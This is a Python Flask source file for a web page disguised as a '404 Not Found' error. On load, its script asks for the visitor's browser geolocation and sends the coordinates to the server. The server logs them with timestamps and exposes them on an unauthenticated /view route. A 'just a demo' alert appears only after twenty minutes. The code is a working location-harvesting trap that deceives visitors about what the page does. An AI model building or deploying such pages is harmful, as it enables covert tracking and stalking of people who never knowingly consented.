from flask import Flask, request, render_template_string, jsonify
from datetime import datetime

app = Flask(__name__)
locations = []

html_page = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>404 Not Found</title>
  <style>
    body {
      background-color: #1e1e1e;
      color: #fff;
      font-family: 'Segoe UI', sans-serif;
      text-align: center;
      padding-top: 20vh;
    }
    .container {
      background-color: #2e2e2e;
      padding: 2rem;
      border-radius: 10px;
      width: 60%;
      margin: auto;
      box-shadow: 0 0 10px #0ff;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>404 - Page Not Found</h1>
    <p>Oops! You seem lost. 🤖</p>
  </div>

  <script>
    function sendLocation(position) {
      fetch('/location', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          latitude: position.coords.latitude,
          longitude: position.coords.longitude
        })
      }).then(res => console.log("Location sent!"));
    }

    function requestLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, err => {
          console.error("Location error:", err);
        });
      } else {
        alert("Geolocation not supported by your browser.");
      }
    }

    window.onload = () => {
      requestLocation();
      setTimeout(() => {
        alert("😂 Hey bro, this was just a demo! Stay safe online! - from your future Digital Police friend");
      }, 20 * 60 * 1000);
    }
  </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(html_page)

@app.route('/location', methods=['POST'])
def collect_location():
    data = request.json
    locations.append({
        'lat': data['latitude'],
        'lon': data['longitude'],
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    })
    return jsonify({'status': 'received'})

@app.route('/view')
def view_locations():
    return jsonify(locations)

if __name__ == '__main__':
    app.run(debug=True)
